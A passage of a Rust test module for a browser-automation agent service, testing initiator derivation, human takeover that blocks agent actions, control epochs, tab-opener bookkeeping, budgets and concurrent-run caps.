        entry.org_id.clone(),
        entry.actor_id.clone(),
        entry.control_mode,
        entry.control_epoch,
    );
    RunHandle::new(entry, live)
}

fn service_claims(org_id: &str, service_id: &str) -> crate::auth::Claims {
    let mut claims = crate::test_support::claims_for_org(org_id);
    claims.principal_type = Some("service".into());
    claims.service_id = Some(service_id.into());
    claims.sub = service_id.into();
    // require_auth copies the signed service id into user_id, which is what
    // actor_id() (and so run ownership) reads.
    claims.user_id = service_id.into();
    claims
}

fn test_state_with_static_driver() -> AppState {
    crate::test_support::test_state(Arc::new(
        quarry_runtime::fetch::StaticDriver::new(std::time::Duration::from_secs(5), "quarry-test")
            .expect("static driver"),
    ))
}

/// A live run owned by `claims`, with a person holding the browser from `epoch`.
fn run_in_takeover(claims: &crate::auth::Claims, epoch: u64) -> RunHandle {
    let mut entry = entry_with_budget(None);
    entry.actor_id = claims.actor_id().to_string();
    entry.control_mode = BrowserControlMode::HumanTakeover;
    entry.control_epoch = epoch;
    handle_for(entry)
}

fn input(initiator: StepInitiator, action: &AgentAction, enforce: bool) -> AdmitInput<'_> {
    AdmitInput {
        initiator: initiator.into(),
        action,
        enforce_takeover: enforce,
        consented_tab_control: false,
        last_observation: None,
        caller: None,
    }
}

fn input_observed<'a>(initiator: StepInitiator, action: &'a AgentAction, enforce: bool, lane: &'a LaneState) -> AdmitInput<'a> {
    AdmitInput {
        initiator: initiator.into(),
        action,
        enforce_takeover: enforce,
        consented_tab_control: false,
        last_observation: lane.last_observation.as_deref(),
        caller: None,
    }
}

#[test]
fn derive_initiator_service_principal_is_agent_even_with_human_hint() {
    let service = service_claims("org", "svc_planner");
    assert_eq!(derive_initiator(&service, None), StepInitiator::Agent);
    assert_eq!(
        derive_initiator(&service, Some(InitiatorHint::Human)),
        StepInitiator::Agent
    );
}

#[test]
fn derive_initiator_user_is_human_unless_hint_tightens() {
    let user = crate::test_support::claims_for_org("org");
    assert_eq!(derive_initiator(&user, None), StepInitiator::Human);
    assert_eq!(
        derive_initiator(&user, Some(InitiatorHint::Human)),
        StepInitiator::Human
    );
    assert_eq!(
        derive_initiator(&user, Some(InitiatorHint::Agent)),
        StepInitiator::Agent
    );
}

/// The six combinations of a verified principal and a client hint. The class follows
/// the token first: a service principal is always an agent; a person is a person unless
/// the hint tightens. The agent identity follows the token too: only a service principal
/// has a verified `principal_id`, and a hint on a person's token never gets one.
#[test]
fn the_initiator_of_each_principal_and_hint_combination() {
    let user = crate::test_support::claims_for_org("org");
    let service = service_claims("org", "service:execution-core");
    let none = AdvisoryAgent::default();

    // (claims, hint, class, basis of the identity if any)
    let table: [(&crate::auth::Claims, Option<InitiatorHint>, StepInitiator, Option<AgentIdentityBasis>); 6] = [
        (&user, None, StepInitiator::Human, None),
        (&user, Some(InitiatorHint::Human), StepInitiator::Human, None),
        (&user, Some(InitiatorHint::Agent), StepInitiator::Agent, Some(AgentIdentityBasis::UserSession)),
        (&service, None, StepInitiator::Agent, Some(AgentIdentityBasis::ServicePrincipal)),
        (&service, Some(InitiatorHint::Human), StepInitiator::Agent, Some(AgentIdentityBasis::ServicePrincipal)),
        (&service, Some(InitiatorHint::Agent), StepInitiator::Agent, Some(AgentIdentityBasis::ServicePrincipal)),
    ];
    for (claims, hint, class, basis) in table {
        let initiator = derive_initiator_ref(claims, hint, &none);
        assert_eq!(initiator.class, class, "{:?} {hint:?}", claims.principal_type);
        assert_eq!(
            initiator.agent.as_ref().map(|agent| agent.basis),
            basis,
            "{:?} {hint:?}",
            claims.principal_type
        );
        // The class never disagrees with the existing rule.
        assert_eq!(initiator.class, derive_initiator(claims, hint));
        // Only a service principal's identity is verified, and it is the signed id.
        match (basis, initiator.agent) {
            (Some(AgentIdentityBasis::ServicePrincipal), Some(agent)) => {
                assert!(agent.is_verified());
                assert_eq!(agent.principal_id.as_deref(), Some("service:execution-core"));
            }
            (Some(AgentIdentityBasis::UserSession), Some(agent)) => {
                assert!(!agent.is_verified());
                assert_eq!(agent.principal_id, None);
            }
            _ => {}
        }
    }
}

/// The advisory fields ride on an agent's identity, are dropped for a person, and are
/// only kept when identifier-shaped: a URL or a title cannot reach a stored record.
#[test]
fn advisory_agent_fields_are_identifier_shaped_and_only_an_agent_keeps_them() {
    let user = crate::test_support::claims_for_org("org");
    let advisory = AdvisoryAgent::new(Some(" run_01J9 "), Some("research-planner.v2"));
    assert_eq!(advisory.ai_run_id.as_deref(), Some("run_01J9"));
    assert_eq!(advisory.label.as_deref(), Some("research-planner.v2"));

    let agent = derive_initiator_ref(&user, Some(InitiatorHint::Agent), &advisory)
        .agent
        .expect("an agent has an identity");
    assert_eq!(agent.ai_run_id.as_deref(), Some("run_01J9"));
    assert_eq!(agent.label.as_deref(), Some("research-planner.v2"));
    assert_eq!(derive_initiator_ref(&user, None, &advisory).agent, None);

    let long = "a".repeat(65);
    for rejected in [
        "",
        "   ",
        "has space",
        "https://example.com/x",
        "a/b",
        "title: secret",
        "tab\u{0}",
        "caf\u{e9}",
        long.as_str(),
    ] {
        let advisory = AdvisoryAgent::new(Some(rejected), Some(rejected));
        assert_eq!(advisory, AdvisoryAgent::default(), "{rejected:?}");
    }
    assert!(AdvisoryAgent::new(Some(&"a".repeat(64)), None).ai_run_id.is_some());
}

/// Every body that carries the hint takes `initiated_by` and `initiatedBy`; both in one
/// body is an error, never a silent pick.
#[test]
fn every_request_body_takes_the_hint_under_both_spellings() {
    use serde_json::json;
    for key in ["initiated_by", "initiatedBy"] {
        let tab: NewTabBody = serde_json::from_value(json!({ key: "agent" })).unwrap();
        assert_eq!(tab.initiated_by, Some(InitiatorHint::Agent), "{key}");
        let query: TabCallQuery = serde_json::from_value(json!({ key: "agent" })).unwrap();
        assert_eq!(query.initiated_by, Some(InitiatorHint::Agent), "{key}");
        let step: StepBody = serde_json::from_value(
            json!({ "action": { "type": "wait", "ms": 0 }, key: "agent" }),
        )
        .unwrap();
        assert_eq!(step.initiated_by, Some(InitiatorHint::Agent), "{key}");
        let start: StartRunBody = serde_json::from_value(json!({ key: "agent" })).unwrap();
        assert_eq!(start.initiated_by.as_deref(), Some("agent"), "{key}");
        let socket: BrowserWsClientMessage = serde_json::from_value(
            json!({ "type": "action", "action": { "type": "wait", "ms": 0 }, key: "agent" }),
        )
        .unwrap();
        assert!(matches!(
            socket,
            BrowserWsClientMessage::Action { actor: Some(InitiatorHint::Agent), .. }
        ));
    }
    assert!(serde_json::from_value::<NewTabBody>(
        json!({ "initiated_by": "human", "initiatedBy": "agent" })
    )
    .is_err());
    // Both spellings in one body are refused on every carrier, never a silent pick.
    let both = json!({ "initiated_by": "human", "initiatedBy": "agent" });
    let with = |extra: serde_json::Value| {
        let mut body = both.clone();
        body.as_object_mut()
            .unwrap()
            .extend(extra.as_object().unwrap().clone());
        body
    };
    assert!(serde_json::from_value::<TabCallQuery>(both.clone()).is_err());
    assert!(serde_json::from_value::<StartRunBody>(both.clone()).is_err());
    assert!(serde_json::from_value::<StepBody>(with(json!({ "action": { "type": "wait", "ms": 0 } })))
        .is_err());
    assert!(serde_json::from_value::<BrowserWsClientMessage>(with(
        json!({ "type": "action", "action": { "type": "wait", "ms": 0 } })
    ))
    .is_err());
    // The socket's own name for it counts as a spelling too.
    assert!(serde_json::from_value::<BrowserWsClientMessage>(json!({
        "type": "action",
        "action": { "type": "wait", "ms": 0 },
        "actor": "human",
        "initiatedBy": "agent",
    }))
    .is_err());
    assert!(serde_json::from_value::<NewTabBody>(json!({ "initiatedBy": "system" })).is_err());

    // The advisory fields take both spellings as well.
    for (run, label) in [("ai_run_id", "agent_label"), ("aiRunId", "agentLabel")] {
        let tab: NewTabBody =
            serde_json::from_value(json!({ run: "run_1", label: "planner" })).unwrap();
        assert_eq!(tab.advisory_agent().ai_run_id.as_deref(), Some("run_1"));
        assert_eq!(tab.advisory_agent().label.as_deref(), Some("planner"));
        let query: TabCallQuery =
            serde_json::from_value(json!({ run: "run_1", label: "planner" })).unwrap();
        assert_eq!(query.advisory_agent(), tab.advisory_agent());
    }
}

/// The tab record keeps only openers of tabs that still exist, drops the ones whose tab
/// is gone first, and past its cap of full records keeps a class-only entry marked
/// `unattributed` rather than letting the tab look like one the browser opened itself.
#[test]
fn the_tab_opener_record_is_bounded_and_prunes_gone_tabs() {
    let mut entry = entry_with_budget(None);
    let origin = |agent: bool| TabOrigin {
        initiated_by: if agent { StepInitiator::Agent } else { StepInitiator::Human },
        agent: None,
        unattributed: false,
    };
    let tab = |id: String| BrowserTab { tab_id: id, title: None, url: None, active: false };

    let first: Vec<BrowserTab> = (0..256).map(|n| tab(format!("t{n}"))).collect();
    for tab in &first {
        remember_tab_opener(&mut entry, &tab.tab_id, origin(true), &first);
    }
    assert_eq!(entry.tab_origins.len(), 256);

    // At the cap with every tab still open: the new tab is kept with its class only, and
    // is marked, so the projection does not show it as a tab nobody opened. The ids of
    // an agent are not kept for it; nothing else is added.
    let service_agent = TabOrigin {
        initiated_by: StepInitiator::Agent,
        agent: Some(AgentIdentity {
            basis: AgentIdentityBasis::ServicePrincipal,
            principal_id: Some("service:execution-core".into()),
            ai_run_id: Some("run_01J9".into()),
            label: Some("planner".into()),
        }),
        unattributed: false,
    };
    let mut crowded = first.clone();
    crowded.push(tab("extra".into()));
    remember_tab_opener(&mut entry, "extra", origin(false), &crowded);
    crowded.push(tab("extra_agent".into()));
    remember_tab_opener(&mut entry, "extra_agent", service_agent, &crowded);
    assert_eq!(entry.tab_origins.len(), 258);
    let marker = |entry: &RunEntry, id: &str| entry.tab_origins[id].clone();
    assert_eq!(
        marker(&entry, "extra"),
        TabOrigin { initiated_by: StepInitiator::Human, agent: None, unattributed: true }
    );
    assert_eq!(
        marker(&entry, "extra_agent"),
        TabOrigin { initiated_by: StepInitiator::Agent, agent: None, unattributed: true }
    );
    assert!(
        entry.tab_origins["t0"] == origin(true),
        "the 256 full records are untouched by the overflow"
    );
    // What the projection shows: the class and the marker, no ids.
    assert_eq!(
        serde_json::to_value(marker(&entry, "extra_agent")).unwrap(),
        serde_json::json!({ "initiatedBy": "agent", "unattributed": true })
    );
    assert_eq!(
        serde_json::to_value(origin(false)).unwrap(),
        serde_json::json!({ "initiatedBy": "human" }),
        "a full record carries no marker"
    );

    // Once tabs are gone their openers are pruned (so open tabs keep their records) and
    // the room that frees makes the next opener a full record again.
    let remaining: Vec<BrowserTab> = vec![tab("t0".into()), tab("extra".into())];
    remember_tab_opener(&mut entry, "extra", origin(false), &remaining);
    assert_eq!(entry.tab_origins.len(), 2);
    assert_eq!(entry.tab_origins["extra"], origin(false));
    assert_eq!(entry.tab_origins["t0"], origin(true));
}

/// A tab that goes away without a close call (the page closed itself, or the user
/// closed it in the browser) loses its opener the next time the tabs are listed, so the
/// record never keeps an entry for a tab the browser no longer has.
#[test]
fn prune_tab_openers_drops_the_openers_of_tabs_that_are_gone() {
    let mut entry = entry_with_budget(None);
    let origin = TabOrigin {
        initiated_by: StepInitiator::Agent,
        agent: None,
        unattributed: false,
    };
    let tab = |id: &str| BrowserTab { tab_id: id.into(), title: None, url: None, active: false };
    let both = vec![tab("a"), tab("b")];
    remember_tab_opener(&mut entry, "a", origin.clone(), &both);
    remember_tab_opener(&mut entry, "b", origin.clone(), &both);
    assert_eq!(entry.tab_origins.len(), 2);

    // "a" vanished with no close call: the listing no longer has it.
    prune_tab_openers(&mut entry, &[tab("b"), tab("tab_home")]);
    assert_eq!(entry.tab_origins.len(), 1);
    assert!(entry.tab_origins.contains_key("b"));
    // Listing again changes nothing, and an empty listing empties the record.
    prune_tab_openers(&mut entry, &[tab("b")]);
    assert_eq!(entry.tab_origins.len(), 1);
    prune_tab_openers(&mut entry, &[]);
    assert!(entry.tab_origins.is_empty());
}

#[test]
fn control_epoch_increments_only_on_change() {
    let live = RunLive::new("org", "user", BrowserControlMode::AgentControl, 0);
    assert_eq!(live.set_mode(BrowserControlMode::AgentControl, None), Ok((false, 0)));
    assert_eq!(live.set_mode(BrowserControlMode::HumanTakeover, None), Ok((true, 1)));
    assert_eq!(live.set_mode(BrowserControlMode::HumanTakeover, None), Ok((false, 1)));
    assert_eq!(live.set_mode(BrowserControlMode::AgentControl, None), Ok((true, 2)));
    assert_eq!(
        live.snapshot(),
        ControlSnapshot {
            mode: BrowserControlMode::AgentControl,
            epoch: 2
        }
    );
}

#[test]
fn control_epoch_is_monotonic_under_concurrent_flips() {
    let live = Arc::new(RunLive::new("org", "user", BrowserControlMode::AgentControl, 0));
    let changes = Arc::new(std::sync::atomic::AtomicU64::new(0));
    let threads: Vec<_> = (0..8)
        .map(|worker| {
            let live = live.clone();
            let changes = changes.clone();
            std::thread::spawn(move || {
                let mut last_seen = 0;
                for i in 0..1000 {
                    let mode = if (worker + i) % 2 == 0 {
                        BrowserControlMode::HumanTakeover
                    } else {
                        BrowserControlMode::AgentControl
                    };
                    if let Ok((true, _)) = live.set_mode(mode, None) {
                        changes.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                    }
                    let epoch = live.snapshot().epoch;
                    assert!(epoch >= last_seen, "epoch went backwards: {epoch} < {last_seen}");
                    last_seen = epoch;
                }
            })
        })
        .collect();
    for thread in threads {
        thread.join().unwrap();
    }
    // Every real change advanced the epoch by exactly one: none lost, none repeated.
    assert_eq!(
        live.snapshot().epoch,
        changes.load(std::sync::atomic::Ordering::SeqCst)
    );
}

#[test]
fn restore_continues_the_checkpointed_epoch() {
    let live = RunLive::new("org", "user", BrowserControlMode::AgentControl, 0);
    live.restore(7, BrowserControlMode::HumanTakeover);
    assert_eq!(
        live.snapshot(),
        ControlSnapshot {
            mode: BrowserControlMode::HumanTakeover,
            epoch: 7
        }
    );
    assert_eq!(live.set_mode(BrowserControlMode::AgentControl, None), Ok((true, 8)));
}

#[test]
fn a_stale_expected_epoch_is_refused_and_changes_nothing() {
    let live = RunLive::new("org", "user", BrowserControlMode::AgentControl, 3);
    assert_eq!(live.set_mode(BrowserControlMode::HumanTakeover, Some(2)), Err(3));
    assert_eq!(live.snapshot().mode, BrowserControlMode::AgentControl);
    assert_eq!(live.set_mode(BrowserControlMode::HumanTakeover, Some(3)), Ok((true, 4)));
}

#[tokio::test]
async fn agent_step_is_refused_during_takeover_with_user_took_over() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 1);
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Back;
    let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
        .await
        .expect_err("an agent action during a takeover is refused");
    assert_eq!(error.code, ErrorCode::UserTookOver);
    assert_eq!(error.code.http_status(), 409);
    let details = error.details.expect("details");
    assert_eq!(details["control_mode"], "human_takeover");
    assert_eq!(details["control_epoch"], 1);
}

#[tokio::test]
async fn a_consented_tab_uses_its_own_control_during_a_global_takeover() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 1);
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::GetContent;
    let mut request = input(StepInitiator::Agent, &action, true);
    request.consented_tab_control = true;
    let admitted = admit_action(&state, &handle, &mut entry, request).await.unwrap();
    assert_eq!(admitted.initiator, StepInitiator::Agent);
    assert_eq!(admitted.control_epoch, 1);
    assert_eq!(handle.live.snapshot().mode, BrowserControlMode::HumanTakeover);
}

#[tokio::test]
async fn human_step_is_allowed_during_takeover() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 1);
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Back;
    // The person's own action passes the control gate (a later gate may still
    // refuse it for other reasons; it must not be this one).
    let result = admit_action(&state, &handle, &mut entry, input(StepInitiator::Human, &action, true)).await;
    if let Err(error) = result {
        assert_ne!(error.code, ErrorCode::UserTookOver);
    }
}

/// R-8 and WS8.F: a person who takes over an agent-class run that hit its cap is not refused
/// and spends nothing, in shadow (the default) and in on. Without the takeover the same
/// person's step on that run still counts (the run class is the budget subject).
#[tokio::test]
async fn a_takeover_step_on_a_capped_agent_class_run_is_not_refused_and_spends_nothing() {
    for mode in [crate::budget::BudgetMode::Shadow, crate::budget::BudgetMode::On] {
        let _pinned = crate::budget::test_mode::pin(mode);
        let state = test_state_with_static_driver();
        let claims = crate::test_support::claims_for_org("org");
        let capped = |takeover: bool| {
            let mut budget = agent_budget(1);
            budget.charge(true, 0);
            let mut entry = entry_with_budget(Some(budget));
            entry.actor_id = claims.actor_id().to_string();
            entry.constraints.max_steps = 1;
            entry.summary.step = 1;
            if takeover {
                entry.control_mode = BrowserControlMode::HumanTakeover;
                entry.control_epoch = 1;
            }
            handle_for(entry)
        };
        let action = AgentAction::Back;

        let handle = capped(true);
        let mut entry = handle.entry.lock().await;
        let steps_before = entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps);
        let admitted = admit_action(&state, &handle, &mut entry, input(StepInitiator::Human, &action, true))
            .await
            .unwrap_or_else(|error| panic!("{mode:?}: the person's takeover step is admitted: {error:?}"));
        assert!(admitted.takeover);
        assert_eq!(
            entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps),
            steps_before,
            "{mode:?}: admission spends nothing"
        );
        assert!(!super::human_browse::counts_against_step_budget(
            admitted.initiator,
            admitted.takeover,
            entry.budget.as_ref()
        ));
        drop(entry);

        let handle = capped(false);
        let mut entry = handle.entry.lock().await;
        let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Human, &action, true))
            .await
            .expect_err("without a takeover a person's step on an agent-class run still counts");
        assert!(
            matches!(error.code, ErrorCode::RateLimited | ErrorCode::BudgetExhausted),
            "{mode:?}: {error:?}"
        );
    }
}

#[tokio::test]
async fn agent_hint_on_user_token_is_refused_during_takeover() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 2);
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Back;
    let initiator = derive_initiator(&claims, Some(InitiatorHint::Agent));
    let error = admit_action(&state, &handle, &mut entry, input(initiator, &action, true))
        .await
        .expect_err("a user token labelled agent is an agent for this call");
    assert_eq!(error.code, ErrorCode::UserTookOver);
}

#[tokio::test]
async fn observe_mode_lets_the_agent_action_through_the_control_gate() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 1);
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Back;
    let result = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, false)).await;
    if let Err(error) = result {
        assert_ne!(error.code, ErrorCode::UserTookOver);
    }
}

/// The order of the gates is part of the contract: cheap local checks first, the
/// gate that consumes state last.
#[tokio::test]
async fn admission_order_is_pinned() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");

    // 1 beats 3: a closed run is "not live" even in a takeover.
    let handle = run_in_takeover(&claims, 1);
    {
        let mut entry = handle.entry.lock().await;
        entry.closed = true;
        let action = AgentAction::Back;
        let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
            .await
            .expect_err("closed");
        assert_eq!(error.code, ErrorCode::NotFound);
    }

    // 3 beats 7 and 9: an agent's raw script on an exhausted run in a takeover is
    // refused for the takeover, not for the script or the budget.
    let mut exhausted = entry_with_budget(Some(exhausted_budget()));
    exhausted.actor_id = claims.actor_id().to_string();
    exhausted.control_mode = BrowserControlMode::HumanTakeover;
    exhausted.control_epoch = 1;
    let handle = handle_for(exhausted);
    {
        let mut entry = handle.entry.lock().await;
        let action = AgentAction::Evaluate { script: "1".into() };
        let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
            .await
            .expect_err("takeover first");
        assert_eq!(error.code, ErrorCode::UserTookOver);
    }

    // 7 beats 9: with the browser handed back, the raw script is denied before the
    // budget is looked at.
    let mut exhausted = entry_with_budget(Some(exhausted_budget()));
    exhausted.actor_id = claims.actor_id().to_string();
    let handle = handle_for(exhausted);
    {
        let mut entry = handle.entry.lock().await;
        let action = AgentAction::Evaluate { script: "1".into() };
        let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Human, &action, true))
            .await
            .expect_err("raw script denied");
        assert_eq!(error.code, ErrorCode::Forbidden);
        assert_ne!(error.code, ErrorCode::BudgetExhausted);
    }
}

#[tokio::test]
async fn takeover_refusal_consumes_no_budget_and_no_approval_grant() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let mut entry = entry_with_budget(Some(agent_budget(5)));
    entry.actor_id = claims.actor_id().to_string();
    entry.control_mode = BrowserControlMode::HumanTakeover;
    entry.control_epoch = 1;
    let handle = handle_for(entry);
    let mut entry = handle.entry.lock().await;
    let steps_before = entry
        .budget
        .as_ref()
        .map(|budget| budget.ledger.snapshot(std::time::Instant::now()).steps);
    let action = respond_dialog();
    let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
        .await
        .expect_err("refused");
    assert_eq!(error.code, ErrorCode::UserTookOver);
    assert!(entry.used_sensitive_approval_grants.is_empty());
    assert_eq!(entry.summary.step, 0);
    assert_eq!(
        entry
            .budget
            .as_ref()
            .map(|budget| budget.ledger.snapshot(std::time::Instant::now()).steps),
        steps_before
    );
}

#[tokio::test]
async fn a_refused_agent_action_leaves_one_skipped_receipt_per_epoch() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 1);
    let run_id = handle.entry.lock().await.run_id.clone();
    let action = AgentAction::Back;
    for _ in 0..3 {
        let mut entry = handle.entry.lock().await;
        let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
            .await
            .expect_err("refused");
        assert_eq!(error.code, ErrorCode::UserTookOver);
    }
    let receipts = state.receipts.list_for_org("org", &run_id).await.unwrap();
    assert_eq!(receipts.len(), 1, "one skipped receipt for the epoch, not one per retry");
    assert!(matches!(receipts[0].outcome, StepOutcome::Skipped { .. }));
    assert_eq!(receipts[0].initiated_by, Some(StepInitiator::Agent));
    assert_eq!(receipts[0].control_epoch, Some(1));

    // The person gives the browser back and takes it again: a new epoch, a new receipt.
    handle.live.set_mode(BrowserControlMode::AgentControl, None).unwrap();
    handle.live.set_mode(BrowserControlMode::HumanTakeover, None).unwrap();
    let mut entry = handle.entry.lock().await;
    admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
        .await
        .expect_err("refused again");
    drop(entry);
    let receipts = state.receipts.list_for_org("org", &run_id).await.unwrap();
    assert_eq!(receipts.len(), 2);
    assert_eq!(receipts[1].control_epoch, Some(3));
}

#[tokio::test]
async fn zdr_run_enforces_gate_but_persists_nothing() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let mut entry = entry_with_budget(None);
    entry.actor_id = claims.actor_id().to_string();
    entry.control_mode = BrowserControlMode::HumanTakeover;
    entry.control_epoch = 1;
    entry.zdr = ZdrMode::On;
    let handle = handle_for(entry);
    let run_id = handle.entry.lock().await.run_id.clone();
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Back;
    let error = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
        .await
        .expect_err("refused");
    assert_eq!(error.code, ErrorCode::UserTookOver);
    drop(entry);
    assert!(state.receipts.list_for_org("org", &run_id).await.unwrap().is_empty());
}

#[tokio::test]
async fn agent_cannot_change_control_mode() {
    let state = test_state_with_static_driver();
    // A run a service principal started and a person has since taken over.
    let service = service_claims("org", "svc_planner");
    let mut entry = entry_with_budget(None);
    entry.actor_id = "svc_planner".into();
    entry.control_mode = BrowserControlMode::HumanTakeover;
    entry.control_epoch = 1;
    let handle = handle_for(entry);
    let run_id = handle.entry.lock().await.run_id.to_string();
    state
        .agent_runs
        .lock()
        .unwrap()
        .insert(run_id.clone(), handle.clone());
    let result = set_browser_session_control(
        State(state.clone()),
        Extension(service),
        Path(run_id),
        Json(BrowserSessionControlBody {
            mode: BrowserControlMode::AgentControl,
            expected_epoch: None,
        }),
    )
    .await;
    let (status, _) = result.expect_err("an agent cannot hand the browser back to itself");
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(
        handle.live.snapshot().mode,
        BrowserControlMode::HumanTakeover,
        "the refused request changed nothing"
    );
}

#[tokio::test]
async fn stale_expected_epoch_returns_conflict() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let handle = run_in_takeover(&claims, 4);
    let run_id = handle.entry.lock().await.run_id.to_string();
    state
        .agent_runs
        .lock()
        .unwrap()
        .insert(run_id.clone(), handle.clone());
    let result = set_browser_session_control(
        State(state.clone()),
        Extension(claims),
        Path(run_id),
        Json(BrowserSessionControlBody {
            mode: BrowserControlMode::AgentControl,
            expected_epoch: Some(1),
        }),
    )
    .await;
    let (status, Json(envelope)) = result.expect_err("stale epoch");
    assert_eq!(status, StatusCode::CONFLICT);
    let rendered = serde_json::to_value(&envelope).unwrap();
    assert_eq!(rendered["error"]["details"]["control_epoch"], 4);
    assert_eq!(handle.live.snapshot().mode, BrowserControlMode::HumanTakeover);
}

#[tokio::test]
async fn control_event_records_derived_initiator_and_epoch() {
    let state = test_state_with_static_driver();
    let claims = crate::test_support::claims_for_org("org");
    let mut entry = entry_with_budget(None);
    entry.actor_id = claims.actor_id().to_string();
    let handle = handle_for(entry);
    let (run_id, run_key) = {
        let entry = handle.entry.lock().await;
        (entry.run_id.clone(), entry.run_id.to_string())
    };
    state
        .agent_runs
        .lock()
        .unwrap()
        .insert(run_key.clone(), handle.clone());
    // The projection read after the flip needs a browser driver that can list
    // tabs; the transition itself and its audit event happen before that.
    let _ = set_browser_session_control(
        State(state.clone()),
        Extension(claims.clone()),
        Path(run_key),
        Json(BrowserSessionControlBody {
            mode: BrowserControlMode::HumanTakeover,
            expected_epoch: None,
        }),
    )
    .await;
    assert_eq!(
        handle.live.snapshot(),
        ControlSnapshot {
            mode: BrowserControlMode::HumanTakeover,
            epoch: 1
        }
    );
    let events = state
        .receipts
        .list_browser_timeline_events("org", claims.actor_id(), &run_id)
        .await
        .unwrap();
    assert!(events.iter().any(|event| matches!(
        &event.event,
        BrowserTimelineEventKind::Control {
            mode: BrowserControlMode::HumanTakeover,
            initiated_by: BrowserTimelineInitiator::Human,
            control_epoch: 1,
        }
    )));
}

// ---- WS2.D: run registry, caps, liveness, sweeper

fn live_with(org: &str, class: crate::budget::RunClass) -> RunHandle {
    let mut entry = entry_with_budget(None);
    entry.org_id = org.into();
    let live = RunLive::new(org, "user", BrowserControlMode::AgentControl, 0).with_run(class, None);
    RunHandle::new(entry, live)
}

fn registry(
    global: u32,
    org: u32,
    interactive: u32,
) -> std::sync::Arc<RunRegistry> {
    let limits = crate::run_limits::RunLimits {
        max_concurrent_runs: global,
        max_runs_per_org: org,
        max_interactive_runs_per_org: interactive,
        ..crate::run_limits::RunLimits::unlimited()
    };
    Arc::new(RunRegistry::new(limits))
}

#[test]
fn reserve_respects_global_org_and_interactive_caps() {
    use crate::budget::RunClass::{Agent, Interactive};
    let runs = registry(5, 3, 2);
    // Organization A fills its interactive sub-cap (2), then its total (3).
    let a1 = runs.try_reserve("org_a", Interactive).unwrap();
    let a2 = runs.try_reserve("org_a", Interactive).unwrap();
    let denied = runs.try_reserve("org_a", Interactive).unwrap_err();
    assert_eq!(denied.reason, "org_interactive_run_cap");
    assert_eq!((denied.limit, denied.active), (2, 2));
    // An agent run still fits under the org total: the sub-cap leaves headroom.
    let a3 = runs.try_reserve("org_a", Agent).unwrap();
    let denied = runs.try_reserve("org_a", Agent).unwrap_err();
    assert_eq!(denied.reason, "org_run_cap");
    assert_eq!(denied.scope, "org");
    // Another organization is not affected by A's caps until the global one.
    let b1 = runs.try_reserve("org_b", Interactive).unwrap();
    let b2 = runs.try_reserve("org_b", Agent).unwrap();
    let denied = runs.try_reserve("org_c", Agent).unwrap_err();
    assert_eq!(denied.reason, "global_run_cap");
    assert_eq!(denied.scope, "global");
    let error = denied.into_error();
    assert_eq!(error.code, ErrorCode::RateLimited);
    assert!(error.retryable);
    assert_eq!(error.details.as_ref().unwrap()["reason"], "global_run_cap");
    assert_eq!(error.details.as_ref().unwrap()["retry_after_seconds"], 10);
    drop((a1, a2, a3, b1, b2));
}

#[test]
fn slot_rolls_back_on_drop_until_committed() {
    use crate::budget::RunClass::Interactive;
    let runs = registry(1, 0, 0);
    let slot = runs.try_reserve("org_a", Interactive).unwrap();
    assert!(runs.try_reserve("org_a", Interactive).is_err(), "the pending slot counts");
    drop(slot); // a failed start
    let slot = runs.try_reserve("org_a", Interactive).expect("capacity came back");
    let handle = live_with("org_a", Interactive);
    let id = handle.entry.try_lock().unwrap().run_id.to_string();
    slot.commit(id, handle);
    // Committed: no longer pending, now a live run, still one against the cap.
    assert_eq!(runs.stats().live, 1);
    assert_eq!(runs.stats().pending, 0);
    assert!(runs.try_reserve("org_a", Interactive).is_err());
}

#[test]
fn remove_decrements_counters() {
    use crate::budget::RunClass::Interactive;
    let runs = registry(1, 0, 0);
    let slot = runs.try_reserve("org_a", Interactive).unwrap();
    let handle = live_with("org_a", Interactive);
    let id = handle.entry.try_lock().unwrap().run_id.to_string();
    slot.commit(id.clone(), handle);
    assert!(runs.try_reserve("org_a", Interactive).is_err());
    runs.lock().unwrap().remove(&id);
    assert!(runs.try_reserve("org_a", Interactive).is_ok());
}

#[test]
fn zero_means_unlimited() {
    use crate::budget::RunClass::Interactive;
    let runs = registry(0, 0, 0);
    let slots: Vec<_> = (0..200)
